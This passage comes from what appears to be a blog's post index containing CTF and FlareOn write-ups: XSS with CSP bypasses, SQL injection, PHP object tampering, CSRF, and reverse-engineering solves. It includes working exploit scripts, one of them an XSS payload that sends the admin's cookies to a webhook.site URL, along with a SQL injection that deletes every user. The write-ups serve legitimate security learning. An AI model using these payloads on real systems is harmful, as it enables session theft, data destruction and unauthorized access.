class=\"text\"&gt;&lt;h1 class=\"light\"&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;/div&gt;Upon inspecting the element, we can observe that there are a few errors present. Content Security Policy Uncaught TypeError: document.getElementById(...) is null Uncaught SyntaxError: expected expression, got ')'Let’s take a look at each of these errors and identify why it give us an error.Content Security Policy (CSP)In the response headers, there is no indicator of CSP implemented. But we can see in the page source how the web page implemented the CSP.&lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; \t script-src 'unsafe-eval' 'strict-dynamic' 'nonce-a5653f86ab0d00e7ea5297f7264c43c0';\t style-src 'nonce-51070e634c401773866289cb83ad269e'\"/&gt;While exploring this CSP further, I came across some interesting information about the usage of strict-dynamic in Content Security Policy (CSP). You can find this information in here strict-dynamic: Allows script which executes on a page to load more scripts via non-“HTML-parser-inserted” script elements using document.createElement(‘script’); or similar (CSP3 and above)To have a quick check for strict-dynamic, we can try compare with and without using document.createElement to get an XSS.&lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta http-equiv=\"Content-Security-Policy\" content=\"default-src 'none'; script-src 'unsafe-eval' 'strict-dynamic' 'nonce-a5653f86ab0d00e7ea5297f7264c43c0'; style-src 'nonce-51070e634c401773866289cb83ad269e'\" /&gt; &lt;/head&gt; &lt;body id=\"body\"&gt; &lt;!-- POC (XSS) #1 --&gt; &lt;script nonce=\"a5653f86ab0d00e7ea5297f7264c43c0\"&gt; let s = document.createElement(\"script\"); s.appendChild(document.createTextNode(\"alert('Using createElement script')\")); document.body.appendChild(s); &lt;/script&gt; &lt;!-- POC (XSS) #2 --&gt; &lt;script nonce-\"a5653f86ab0d00e7ea5297f7264c43c0\"&gt; alert('Without createElement script'); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;As we can observe, only the XSS in the first Proof of Concept (POC) will be executed successfully, whereas the second one will be prevented from executing due to the Content Security Policy (CSP). We will come back to this topic in the solution part later.Uncaught TypeErrorThe error occurs because the web is attempting to retrieve the element with the id “lock,” but it cannot be found, resulting in the value becoming null.&lt;script nonce=\"afedac0a9a5507ad03f76ca4f5d76a81\"&gt;document.getElementById('lock').onclick = () =&gt;\t{document.getElementById('lock').classList.toggle('unlocked');}&lt;/script&gt;Despite encountering this error, we can still proceed with solving the challenge. The absence of the “lock” element and the resulting null value does not stop us to find a solution.Uncaught SyntaxErrorThis error occurs within the snippet of JavaScript code provided below:&lt;script nonce=\"afedac0a9a5507ad03f76ca4f5d76a81\"&gt; window.addEventListener(\"DOMContentLoaded\", function () { e = `)]}'` + new URL(location.href).searchParams.get(\"xss\"); c = document.getElementById(\"body\").lastElementChild; if (c.id === \"intigriti\") { l = c.lastElementChild; i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e; } let s = document.createElement(\"script\"); s.type = \"text/javascript\"; s.appendChild(document.createTextNode(e)); document.body.appendChild(s); });&lt;/script&gt;Since the parameter xss was not provided, the value of e will be null. The result variable will hold the value )]}'. Consequently, when attempting to find an element with the id “intigriti” it won’t be found in the page source. Therefore, we can assume that the generated script element will resemble the following:&lt;script type=\"text/javascript\"&gt;\t&lt;script type=\"text/javascript\"&gt;)]}'null&lt;/script&gt;&lt;/script&gt;So now we know the parameter xss will be a useful for us to get an XSS.Walkthrough SolutionWe now have two parameters that we can use html and xss. Just now we only manage to to append characters/payload after the value )]}' in variable e. But, in the snippet code below we found out that variable f will be append before the variable e.&lt;script nonce=\"afedac0a9a5507ad03f76ca4f5d76a81\"&gt;----[snip]----c = document.getElementById(\"body\").lastElementChild;if (c.id === \"intigriti\") { l = c.lastElementChild; i = l.innerHTML.trim(); f = i.substr(i.length - 4); e = f + e;}----[snip]----&lt;/script&gt;Let’s try insert a simple payload with id intigriti?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;script&gt;&amp;xss=xssThe variable f will contain the value “tml&gt;” after using the substr() function to retrieve the last four characters from the variable i.The final value that can be obtained from document.createElement(\"script\") as follows.&lt;script type=\"text/javascript\"&gt;tml&gt;)]}'xss&lt;/script&gt;Since we can manipulate the 4 characters. There are 2 ways that we can try and what I observe from other references too. Make the value stored into a variable. Example: a=')]}' Ensure the value )]}' will not causing any errors even without storing it.Solution 1The first solution we want to try store it into a variable. Fortunately, all the tags will automatically close, so we only need to focus on the tags that may contain a single quote (‘). The payload I initially attempted is as follows.?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;a='&gt;&lt;script&gt;&amp;xss=xssBut we still can’t have the a='&gt; yet as our 4 characters.When we add another tag before &lt;a='&gt;, it seems like we manage to get what we want?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;nothing&gt;&lt;a='&gt;&lt;script&gt;&amp;xss=xssThe final payload we just need to add necessary codes to execute our XSS payload alert(document.domain) using the xss parameter as follows:?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;nothing&gt;&lt;a='&gt;&lt;script&gt;&amp;xss=;alert(document.domain)&lt;script type=\"text/javascript\"&gt;a='&gt;)]}';alert(document.domain)&lt;/script&gt;Solution 2In the second solution, our goal is to ensure that our payload does not break the JavaScript code, while also do not need storing the value in a variable. To achieve this, let’s reassess our situation. Assume we have the following code:&lt;script type=\"text/javascript\"&gt;\t)]}'&lt;/script&gt;When we run the HTML file as shown above, we will encounter an error: Uncaught SyntaxError: expected expression, got ')'. To address this issue, let’s attempt to add a ( character infront.&lt;script type=\"text/javascript\"&gt;\t())]}'&lt;/script&gt;Upon making the suggested modification, we will encounter a different error: Uncaught SyntaxError: unexpected token: ')'. In the given scenario, let’s assume we need to add a tag, such as &lt;aa&gt;. By doing so, we will obtain a value of /aa&gt; for the four characters. Now, let’s proceed to add a bracket within this payload.?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;nothing&gt;&lt;a(&gt;&lt;script&gt;&amp;xss=xssWe will get as follows. Also, we only have this error Uncaught SyntaxError: unterminated regular expression literal.&lt;script type=\"text/javascript\"&gt;/a(&gt;)]}'xss&lt;/script&gt;It appears that the provided expression is being interpreted as a regular expression. Therefore, with the current payload of /a(&gt;)]}'xss, we need to include another / at the end to properly close the regular expression. More information on this issue can be found in here . Thus, our final payload will be as follows.?html=&lt;/h1&gt;&lt;/div&gt;&lt;div id=\"intigriti\"&gt;&lt;nothing&gt;&lt;a(&gt;&lt;script&gt;&amp;xss=/;alert(document.domain)&lt;script type=\"text/javascript\"&gt;/a(&gt;)]}'/;alert(document.domain)&lt;/script&gt;It was an intriguing challenge that helped me learn many new things!References https://blog.isiraadithya.com/intigriti-1021-xss-challenge-solution-writeup/" }, { "title": "TJCTF 2023 - Writeup", "url": "/posts/TJCTF-2023-Writeup/", "categories": "ctf", "tags": "ctf, writeup", "date": "2023-05-27 08:00:00 +0800", "snippet": "Welcome to my blog, where I will share a write-up on the web challenges. I am a member of Team M53 from Malaysia, and we participated in the TJCTF 2023 competition this year.Link to archive challenges: https://github.com/sajjadium/ctf-archives/tree/main/ctfs/TJCTF/2023Category : WebWeb : pay-to-win This service is wayyyyy to expensive. I can’t afford that! I did hear that premium users get a flag though…Source Code (server.zip) : server.zipLooking at the Dockerfile, the flag is located in /secret-flag-dir/flag.txtRUN mkdir /secret-flag-dir; mv /app/flag.txt /secret-flag-dir/flag.txtThe code provided represents a Flask application with three endpoints. / (GET): This is the root endpoint of the application /login (GET): This endpoint is used to display the login page /login (POST): This endpoint is used for user loginWhen a random username, such as test, is entered on the web page, it will redirect to another page. The web page mentioned that the current user is not a premium user.Inside app.py, it can be observed that by default, all new users will have their user_type set to basicdata = {\t\"username\": username,\t\"user_type\": \"basic\"}If we can find a way to modify the user_type to premium, it may grant us access to a different page, potentially enabling us to read the flag.if payload['user_type'] == 'premium':\ttheme_name = request.args.get('theme') or 'static/premium.css'\treturn render_template('premium.jinja', theme_to_use=open(theme_name).read())else:\treturn render_template('basic.jinja')Every new user will have a randomly generated hexadecimal value associated with their username using the following code snippetif username not in users: users[username] = hex(random.getrandbits(24))[2:]The randomly generated value, which we are unaware of, is then used to create a hash that ensures the data cannot be easily alteredhash(data + users[payload['username']])During the CTF, I attempted to brute force the known hash we obtained in the response. The solution script can be found below.from base64 import b64encodeimport hashlib,json,random,requestsdef hash(data): return hashlib.sha256(bytes(data, 'utf-8')).hexdigest()data = { \"username\": \"\", \"user_type\": \"basic\"}found_hash = \"\"b64data = b64encode(json.dumps(data).encode())while \"73553a6d471a7fea554237c8aafa72327a4b29446d59be71a9ef1c4d5a7d908e\" != found_hash: found_users = hex(random.getrandbits(24))[2:] found_hash = hash(b64data.decode() + found_users)print(\"[+] Found!\")print(\"[+] Craft Payload (premium)\")data = { \"username\": \"\", \"user_type\": \"premium\"}b64data = b64encode(json.dumps(data).encode())data_hash = hash(b64data.decode() + found_users)print(\"data = \"+b64data.decode())print(\"hash = \"+data_hash)print(\"[+] Get the flag!\")cookies={ \"data\":b64data.decode(), \"hash\":data_hash}resp = requests.get(\"https://pay-to-win.tjc.tf/?theme=/secret-flag-dir/flag.txt\",cookies=cookies)for i in resp.text.split(): if \"tjctf\" in i: print(i) breakWeb : ez-sql just your average sql challenge, nothing else to see here (trust)Source Code (app.js) : app.jsIt is quite evident that this challenge involves SQL injection in the search endpoint.app.get('/search', (req, res) =&gt; { const { name } = req.query; if (!name) { return res.status(400).send({ err: 'Bad request' }); } if (name.length &gt; 6) { return res.status(400).send({ err: 'Bad request' }); } db.all(`SELECT * FROM jokes WHERE joke LIKE '%${name}%'`, (err, rows) =&gt; { if (err) { console.error(err.message); return res.status(500).send('Internal server error'); } return res.send(rows); });});The flag is stored in a table that starts with flag_, and within that table, there is a column named flag which contains the flag we want to read.const flag = fs.readFileSync('./flag.txt', { encoding: 'utf8' }).trim();const flagTable = `flag_${uuid.v4().replace(/-/g, '_')}`;db.run(`INSERT INTO ${flagTable} (flag) VALUES ('${flag}')`);Upon reviewing the search function again, it appears that the SELECT statement is vulnerable to SQL injection in the LIKE clause. By using the input %'--, we can exploit this vulnerability and retrieve all the data. We can easily craft a payload to retrieve the flag; however, there is a constraint that prevents us from doing so. The input we provide cannot exceed 6 characters, as any input longer than 6 characters will result in a Bad Request response{\"err\":\"Bad request\"}I would like to acknowledge and thank my team member, @Stephen, for discovering a method to bypass the length constraint. By utilizing [] in the parameter, it transforms the input into an array format, effectively circumventing the length limitation. The solution script can be found below.import requestsimport urllib3urllib3.disable_warnings()# (1)payload = \"nothinghere' UNION SELECT 1,tbl_name from sqlite_master where type='table' and tbl_name like 'flag_%'--\"response = requests.get(f\"https://ez-sql-bc4100ee1e8b238e.tjc.tf/search?name[]={payload}\", verify=False)flag_tbl = response.text.replace('[{\"id\":1,\"joke\":\"','').replace('\"}]','')print(f\"Table name: {flag_tbl}\")# (2)payload = f\"nothinghere' UNION SELECT 1,flag from {flag_tbl}--\"response = requests.get(f\"https://ez-sql-bc4100ee1e8b238e.tjc.tf/search?name[]={payload}\", verify=False)flags = response.text.replace('[{\"id\":1,\"joke\":\"','').replace('\"}]','')print(f\"Flag = {flags}\")Web : notes obligatory notes site?Source Code (server.zip) : server.zipThis challenge took me a while to solve during the CTF as I could only work on it during my free time. It was time-consuming to thoroughly comprehend the code and figure out how to exploit it in order to obtain the flag.Based on the provided code, the following are the important endpoints involved in the application: /login (POST): Handles the login functionality. Verifies the username and password against the database and associates the session with the user if the credentials are correct. /register (POST): Handles the login functionality. Verifies the username and password against the database and associates the session with the user if the credentials are correct. /user/delete (POST): Handles user deletion functionality. Deletes the user from the database, along with their associated notes, if the provided password matches the user’s password. /note/create (POST): Handles the creation of a new note. Inserts a new note into the database associated with the currently logged-in user.The important code snippets that are relevant to obtaining the flag are as follows:app.get('/', (req, res) =&gt; { if (!req.session.user_id) { return res.redirect('/login?e=login%20to%20make%20notes'); } pool.query(`SELECT * FROM notes WHERE user_id = '${req.session.user_id}';`, (err, results) =&gt; { pool.query(`SELECT * FROM users WHERE id = '${req.session.user_id}';`, (err, users) =&gt; { res.render('index', { notes: results, user: users[0] || { username: flag } }); }); });});In this code snippet, the first query selects all the notes associated with the user ID stored in the session. The second query retrieves the user’s information from the users table based on the user ID. If the users array is empty or no user is found, the username value in the rendered view will be set to the value of the flag variable. To simplify the understanding, we need to ensure that we can delete the data in the table without destroying the session.The DELETE statement in the /user/delete endpoint is vulnerable to SQL injection, which allows us to use a second account to delete all accounts without destroying the session of the first account.DELETE FROM users WHERE id = '${id}' AND password = '${req.body.password}';I have created a simple script to automate the tasks and retrieve the flag based on the information provided above.import requests, urllib3urllib3.disable_warnings()# (1) Register Accountheaders = { 'Content-Type': 'application/x-www-form-urlencoded',}data = { 'username': \"test\", 'password': 'test',}s = requests.Session()r = s.post('https://notes-dd58abacdabdcce9.tjc.tf/register', headers=headers, data=data, verify=False)print(\"[+] Done Create an Account\")# (2) Create a note with username = \"test\"data = { \"note\": \"test\"}r = s.post('https://notes-dd58abacdabdcce9.tjc.tf/note/create', headers=headers, data=data,verify=False)print(\"[+] Done Create Post\")cookies =s.cookies.get_dict()# (3) Create 2nd account data = { \"username\" :\"test2\", \"password\": \"test2\"}s2 = requests.Session()r2 = s2.post('https://notes-dd58abacdabdcce9.tjc.tf/register', headers=headers, data=data, verify=False)print(\"[+] Done Create 2nd account\")# (4) Delete all account without destroy the session for username = \"test\" using 2nd accountdata = { \"password\":\"' OR 1=1;-- -\"}r2 = s2.post('https://notes-dd58abacdabdcce9.tjc.tf/user/delete', headers=headers, data=data, verify=False)print(\"[+] Done delete account\")# (5) Get Flagfor i in s.get('https://notes-dd58abacdabdcce9.tjc.tf/',cookies=cookies).text.split(): if \"tjctf\" in i: print(\"[+] Found flag: \"+i) breakWeb : yolo I found this website that makes me really emotional because it’s so motivational…Source Code (server.zip) : server.zipThis challenge has two links: one for sending a URL to the admin and another one for us to post something. Usually, this challenge might be related to Cross-Site Scripting (XSS). First, let us find out where the flag is located.The flag can be found in the admin notes within the toDo section. Therefore, we need to discover the endpoint that allows us to browse the note.import flag from './flag.txt';function sleep(time) { return new Promise(resolve =&gt; { setTimeout(resolve, time); });}export default { id: 'yolo', name: 'yolo', urlRegex: /^https:\\/\\/yolo\\.tjc\\.tf\\//, timeout: 10000, handler: async (url, ctx) =&gt; { const page = await ctx.newPage(); await page.goto('https://yolo.tjc.tf', { waitUntil: 'domcontentloaded' }); await sleep(1000); await page.type('#name', 'admin'); await page.type('#toDo', flag.trim()); await page.click('#submit'); await sleep(500); await page.goto(url, { timeout: 3000, waitUntil: 'domcontentloaded' }); await sleep(3000); }};If we attempt to send a common payload like &lt;script&gt;alert(1)&lt;/script&gt;, it will not execute the XSS attack due to the presence of Content Security Policy (CSP) protection on the web page. Here is the CSP being used by the web server.res.header('Content-Security-Policy', `script-src 'nonce-${req.locals.nonce}'; default-src 'self'; style-src 'self' 'nonce-${req.locals.nonce}';`);The nonce value is particularly interesting to investigate further, as there are a few lines of code within the following function that utilize a static value on the initial requestapp.addHook('onRequest', (req, res, next) =&gt; {.... req.locals.nonce = req.locals.nonce ?? '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d'; req.locals.nonce = crypto.createHash('sha256').update(req.locals.nonce).digest('hex'); res.header('Content-Security-Policy', `script-src 'nonce-${req.locals.nonce}'; default-src 'self'; style-src 'self' 'nonce-${req.locals.nonce}';`);.... next();});....When we make the first request, our nonce will be set to the value 34dce4583c235ebfa8e06020ae7f81ccc0007b05baf6cca9c03ae07930c64b4f, as there is no existing nonce value initially. Subsequent requests will continue to follow the same pattern, allowing us to easily craft our XSS payload with the predictable nonce value on each request.Looking back at the admin-bot.js, we can confirm that our URL will be browsed by the admin on the 3rd request. Therefore, we can utilize the following code to generate the nonce value for the third request.const crypto = require('crypto');const firstnonce = '47baeefe8a0b0e8276c2f7ea2f24c1cc9deb613a8b9c866f796a892ef9f8e65d';const first_request = crypto.createHash('sha256').update(firstnonce).digest('hex');const second_request = crypto.createHash('sha256').update(first_request).digest('hex');const third_request = crypto.createHash('sha256').update(second_request).digest('hex');console.log(third_request);With the given nonce value, we can now create an XSS payload to send to the admin. It is crucial to obtain the admin’s cookies, as the endpoint leading to the flag is present within the JWT token. Below is the solution script I developed during the CTF:import requests, urllib3, base64, jsonurllib3.disable_warnings()cookies = { 'token': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2ODUyMDY4NjYsIm5vbmNlIjoiNmNmYTQ2MGMzNGQzYjQ0ODc2N2ViNDdlZGI5YTczZDAzMDYxZTkxM2NkOGE3ZDcxMjM0MGNjZGY4YjM0MmMzNiIsInVzZXJJZCI6ImIxNzQ4MTU0LTg5ZTktNDJiYi1hMjc5LTNjOWU0NmVlOTM3YiJ9.n24-3ah7Q1YjfJlA-MgzUXeSAVh8WiTWpKfCqrVU9Z8',}headers = { 'Content-Type': 'application/x-www-form-urlencoded',}data = { 'name': 'test', 'toDo': '&lt;script nonce=\"6cfa460c34d3b448767eb47edb9a73d03061e913cd8a7d712340ccdf8b342c36\"&gt;document.location=\"https://webhook.site/cc03ff0d-5728-482d-ad83-6a305fd0e4a7/?c=\"+document.cookie&lt;/script&gt;',}# (1) Generate XSS payloadresponse = requests.post('https://yolo.tjc.tf/', cookies=cookies, headers=headers, data=data, verify=False,allow_redirects=False)locations = \"https://yolo.tjc.tf\"+response.headers['Location']print(f\"[+] Send to admin this link : {locations}\")# (2) Send to Admincookies_b64 = input(\"[+] Enter cookies values : \")userid = json.loads(base64.b64decode(cookies_b64.split(\".\")[1]).decode())['userId']# (3) Get Flagresponse = requests.get(f'https://yolo.tjc.tf/do/{userid}')for i in response.text.split(): if \"tjctf\" in i: print(i) break" }, { "title": "FlareOn2 2015 - Challenge 2", "url": "/posts/FlareOn-02-2015-Challenge-2/", "categories": "flareon", "tags": "flareon", "date": "2023-02-27 08:00:00 +0800", "snippet": "This write-up serves as a personal reference and a tool for me to practice FlareOn. It includes information and solutions collected from various sources.ChallengeChallenge 2.zip : Challenge 2.zip# file very_success very_success: PE32 executable (console) Intel 80386, for MS WindowsPassword: flareWalkthrough &amp; SolutionWhen we run the program, it prompts us to enter a password. However, if we enter the incorrect password, the program outputs the message ‘You are failure’. This challenge is almost the same as the first challenge.PS &gt; .\\very_success.exeYou crushed that last one! Let's up the game.Enter the password&gt; passwordYou are failureLooking at the code for FUN_00401000, I noticed that it is similar to the previous challenge, but there is no straightforward XOR operation. Instead, our input is used by FUN_00401084 to perform some operation and return a boolean value.iVar1 = FUN_00401084(unaff_retaddr,&amp;DAT_00402159,local_4)This line will accept 3 arguments: First argument = data located at return address Second argument = our input Third argument = Length of our inputThe jl instruction at loc_401096 checks whether the value at [ebp+arg_8] (our inputs) is less than 0x25. If it is, the function jumps to loc_4010D7. Otherwise, it continues execution.This means our input must be more than 37 (0x25)Input: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA (37)The code above loads the values of [ebp+arg_4] and [ebp+arg_0] into the esi and edi registers, respectively. It then calculates the address of the last character of the string and stores it in edi. Some similar codes can also be found in Ghidra.I tried to set breakpoint at the EDI and jump to the hex view. We found these values.AF AA AD EB AE AA EC A4 BA AF AE AA 8A C0 A7 B0 BC 9A BA A5 A5 BA AF B8 9D B8 F9 AE 9D AB B4 BC B6 B3 90 9A A8 Some operation involve inside loc_4010A2 such as AND, XOR and ROL.Python script (Reverse):# Function ROLdef rol(byte, count): byte = (byte &lt;&lt; count | byte &gt;&gt; (8 - count)) &amp; 0xFF # byte = (byte &gt;&gt; count | byte &lt;&lt; (8 - count)) &amp; 0xFF (ROR) return byte# Enc Flagsdata = \"\".join(map(chr, bytes.fromhex('AF AA AD EB AE AA EC A4 BA AF AE AA 8A C0 A7 B0 BC 9A BA A5 A5 BA AF B8 9D B8 F9 AE 9D AB B4 BC B6 B3 90 9A A8')))[::-1]# Initialize RegistersAH = AL = AX = BX = DX = 0flags = \"\"# Loop each Enc Flagsfor i in range(0,len(data)):\tAH = rol(1, DX)\tAL = (ord(data[i]) - AH -1) ^ 0xC7\tBX = BX + ord(data[i])\tDX = BX &amp; 3\tflags += chr(AL)print(flags)Flag : a_Little_b1t_harder_plez@flare-on.comReferences https://github.com/fareedfauzi/Flare-On-Challenges/blob/master/Write-ups/2015/2015solution2.pdf https://www.tophertimzen.com/blog/flareOn/ https://www.ghettoforensics.com/2015/09/solving-2015-flare-on-challenges.html https://github.com/angr/angr-doc/blob/master/examples/flareon2015_2/solve.py https://secwriteups.blogspot.com/2016/08/flare-on-2015-challenge-2.html https://buildfunthings.com/posts/flare-on-2015-challenge-2/ http://0x0atang.github.io/reversing/2015/09/17/flareon2-concolic.html https://www.aldeid.com/wiki/The-FLARE-On-Challenge-2015/Challenge-2 https://rstforums.com/forum/topic/106101-flare-on-2015-level-2-very_successexe/ https://www.redblue.team/2015/11/solving-2015-flare-on-re-contest.html https://unhere.com/2015/09/09/flare-on-challenge-2015-2/" }, { "title": "HackTM CTF 2023 - Writeup", "url": "/posts/HackTM-CTF-2023-Writeup/", "categories": "ctf", "tags": "ctf, writeup", "date": "2023-02-19 08:00:00 +0800", "snippet": "This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.Category : WebWeb : Blog We made a new blogging website for everyone to use! It’s pretty basic for now, and it has a few limitations like: No comments Semi-working authentication system Lots of random checks slowing down the entire website honestly (i don’t know what’s going on so i’m not touching it) To mitigate that, we made it such that only you can view your own posts. No onecan hack us now &gt;:) Link: http://34.141.16.87:30000/ File: dist.zipWe received a file named dist.zip, which includes a dockerfile that contains a COPY function to transfer the contents of ./chal/flag.txt to /02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt COPY: The COPY instruction in a Dockerfile is used to copy files or directories from the host machine into the container during the build process.In util.php, the file_get_contents PHP function is used to retrieve a user’s profile image.class Profile {\tpublic function __toString() {\t\t\t// ------snip------\t\t\t$picture = base64_encode(file_get_contents($this-&gt;picture_path));\t\t\t// ------snip------\t }}When a new account is registered and a user logs in, a cookie is generated that contains a serialized PHP object in base64 format. Encoded Base64 Tzo0OiJVc2VyIjoyOntzOjc6InByb2ZpbGUiO086NzoiUHJvZmlsZSI6Mjp7czo4OiJ1c2VybmFtZSI7czo4OiJhZG1pbjMyMSI7czoxMjoicGljdHVyZV9wYXRoIjtzOjI3OiJpbWFnZXMvcmVhbF9wcm9ncmFtbWVycy5wbmciO31zOjU6InBvc3RzIjthOjA6e319 Decoded Base64 O:4:\"User\":2:{s:7:\"profile\";O:7:\"Profile\":2:{s:8:\"username\";s:8:\"admin321\";s:12:\"picture_path\";s:27:\"images/real_programmers.png\";}s:5:\"posts\";a:0:{}} The serialized PHP object contains the path to the user’s profile image. When the server responds to the user’s request, the response includes the base64-encoded content of the user’s profile image.To retrieve the flag, we modify the path to the profile image in the serialized PHP object to point to the flag path, and then decode the base64 response.O:4:\"User\":2:{s:7:\"profile\";O:7:\"Profile\":2:{s:8:\"username\";s:8:\"admin321\";s:12:\"picture_path\";s:46:\"/02d92f5f-a58c-42b1-98c7-746bbda7abe9/flag.txt\";}s:5:\"posts\";a:0:{}}Flag: HackTM{r3t__toString_1s_s0_fun_13c573f6}" }, { "title": "FlareOn2 2015 - Challenge 1", "url": "/posts/FlareOn-02-2015-Challenge-1/", "categories": "flareon", "tags": "flareon", "date": "2023-02-19 08:00:00 +0800", "snippet": "This write-up serves as a personal reference and a tool for me to practice FlareOn. It includes information and solutions collected from various sources.ChallengeChallenge 1.zip : Challenge 1.zip# file Flare-On_start_2015.exe Flare-On_start_2015.exe: PE32+ executable (GUI) x86-64, for MS WindowsPassword: flareWalkthrough &amp; SolutionWhen you open the Flare-On_start_2015.exe , a license agreement will appear that you will need to accept in order to proceed.After accepting the license agreement, the program will prompt you to choose a destination path where you want to extract the contents.After extracting the contents, you will find a file named i_am_happy_you_are_to_playing_the_flareon_challenge.exe# file i_am_happy_you_are_to_playing_the_flareon_challenge.exe i_am_happy_you_are_to_playing_the_flareon_challenge.exe: PE32 executable (console) Intel 80386, for MS WindowsWhen we run the program, it prompts us to enter a password. However, if we enter the incorrect password, the program outputs the message ‘You are failure’.PS &gt; .\\i_am_happy_you_are_to_playing_the_flareon_challenge.exeLet's start out easyEnter the password&gt;flareonYou are failureI’m going to open it with Ghidra. If you encounter an issue with a missing OpenJDK 17 installation on your Windows system, you can download it from this website: https://learn.microsoft.com/en-us/java/openjdk/downloadBased on the decompiled entry function provided, the XOR operation performed in the code snippet will iterate over each byte of the user’s input, XOR it with the hexadecimal value 0x7d, and compare the result with the corresponding byte in another variable.Let’s extract all the information we need and use python to get our flag.stored = b'\\x1f\\x08\\x13\\x13\\x04\\x22\\x0e\\x11\\x4d\\x0d\\x18\\x3d\\x1b\\x11\\x1c\\x0f\\x18\\x50\\x12\\x13\\x53\\x1e\\x12\\x10'flag = \"\"for i in stored:\tflag+=chr(i^0x7d)print(flag)Flag : bunny_sl0pe@flare-on.comReferences https://secwriteups.blogspot.com/2016/08/flare-2015-challenge-1.html https://www.ghettoforensics.com/2015/09/solving-2015-flare-on-challenges.html https://www.aldeid.com/wiki/The-FLARE-On-Challenge-2015/Challenge-1 https://github.com/fareedfauzi/Flare-On-Challenges/blob/master/Write-ups/2015/2015solution1.pdf https://m.alvar.es/2015/10/fireeye-flareon-2015-challenges-1-3.html http://nieluj.github.io/flareon2/ http://camelinc.info/blog/2015/08/FLARE-on-Challenge-2015/ https://www.tophertimzen.com/blog/flareOn/ https://blog.wirhabenstil.de/2015/09/09/fireeye-flare-challenge-2015-write-up-level-1/ https://blog.csdn.net/weixin_53349587/article/details/122300468" }, { "title": "LA CTF 2023 - Writeup", "url": "/posts/LACTF-2023-Writeup/", "categories": "ctf", "tags": "ctf, writeup", "date": "2023-02-11 08:00:00 +0800", "snippet": "This write-up serves as a personal reference and a tool for me to practice CTF. It includes information and solutions collected from various sources, including challenges that were not solved during the event.Link to archive challenges: https://github.com/uclaacm/lactf-archive/tree/master/2023Category : WebWeb : College Tour Welcome to UCLA! To explore the #1 public college, we have prepared a scavenger hunt for you to walk all around the beautiful campus. Link: https://college-tour.lac.tfWith a simple use of the curl command, collecting all six flags from the three files, index.html, index.css, and script.js, becomes effortless.└─# curl -ks https://college-tour.lac.tf/ | tr \" \" \"\\n\" | tr \"\\\"\" \"\\n\" | grep -Ev \"lOsT|\\!N|number_text|03LT3r\" | grep -i lactflactf{1_j03_4}--&gt;lactf{2_nd_j0}lactf{4_n3_bR}.pdf└─# curl -ks https://college-tour.lac.tf/index.css | tr \" \" \"\\n\" | tr \"\\\"\" \"\\n\" | grep -Ev \"lOsT|\\!N|number_text|03LT3r\" | grep -i lactflactf{3_S3phI}└─# curl -ks https://college-tour.lac.tf/script.js | tr \" \" \"\\n\" | tr \"\\\"\" \"\\n\" | grep -Ev \"lOsT|\\!N|number_text|03LT3r\" | grep -i lactflactf{6_AY_hi}cookie=lactf{5_U1n_s}Flag: lactf{j03_4nd_j0S3phIn3_bRU1n_sAY_hi}Web : Metaverse Metaenter the metaverse and metapost about metathings. All you have to metado is metaregister for a metaaccount and you’re good to metago. Link: https://metaverse.lac.tf You can metause our fancy new metaadmin metabot to get the admin to metaview your metapost!Source Code (index.js) : index.jsThis code defines a simple web application using the Express framework in Node.js. The application allows users to register and log in, post updates, and view other users’ posts.The code sets up the following routes: /post/:id: This route displays the content of a post with the given ID. /: This route requires the user to be logged in and serves static HTML content. /login: This route serves static HTML content for the login page. /register: This route handles the user registration process. /login: This route handles the user login process.We can easily register an account and login.Looking at the source code, the flag is located in displayname of the admin account.accounts.set(\"admin\", { password: adminpw, displayName: flag, posts: [], friends: [],});Also, the display name will be available at home page if they also add our username as a friend. Since, we can create anything for the admin to access via https://admin-bot.lac.tf/metaverse. Let’s create a CSRF payload to send to admin to add our username as a friend.Payload CSRF:&lt;html&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action=\"https://metaverse.lac.tf/friend\" method=\"POST\"&gt; &lt;input type=\"hidden\" name=\"username\" value=\"admin123\" /&gt; &lt;input type=\"submit\" value=\"Submit request\" /&gt; &lt;/form&gt; &lt;script&gt; document.forms[0].submit(); &lt;/script&gt; &lt;/body&gt;&lt;/html&gt;Flag : lactf{please_metaget_me_out_of_here}Web : my-chemical-romance When I was… a young boy… I made a “My Chemical Romance” fanpage! Link: https://my-chemical-romance.lac.tfInside the response, we can see it stated “Mercurial-SCM”. Mercurial: is a free, distributed version control system (VCS) that provides fast and efficient handling of source code and other development files. It is commonly known as Mercurial-SCM, where “SCM” stands for “Source Code Management.” Mercurial enables developers to keep track of changes to their code, collaborate with others, and maintain multiple versions of their codebaseLet’s first install mercurial (hg)sudo apt-get install mercurialWe can easily clone a repository using hg command.hg clone https://my-chemical-romance.lac.tf/ dumpWhen we see the log using hg log -v, we can see changeset 0 and 1changeset: 1:3ecb3a79e255tag: tipuser: bliutech &lt;bensonhliu@gmail.com&gt;date: Fri Feb 10 06:50:48 2023 -0800files: gerard_way2001.py static/index.htmldescription:Decided to keep my favorite song a secret :Dchangeset: 0:2445227b04cduser: bliutech &lt;bensonhliu@gmail.com&gt;date: Fri Feb 10 06:49:48 2023 -0800files: gerard_way2001.py static/404.html static/index.css static/index.html static/mcr-meme.jpeg static/my-chemical-romance.jpegdescription:I love 'My Chemical Romance'To check our current changeset, we can use hg headschangeset: 1:3ecb3a79e255tag: tipuser: bliutech &lt;bensonhliu@gmail.com&gt;date: Fri Feb 10 06:50:48 2023 -0800summary: Decided to keep my favorite song a secret :DTo change to 0 we can use hg update -r 0# hg update -r 02 files updated, 0 files merged, 0 files removed, 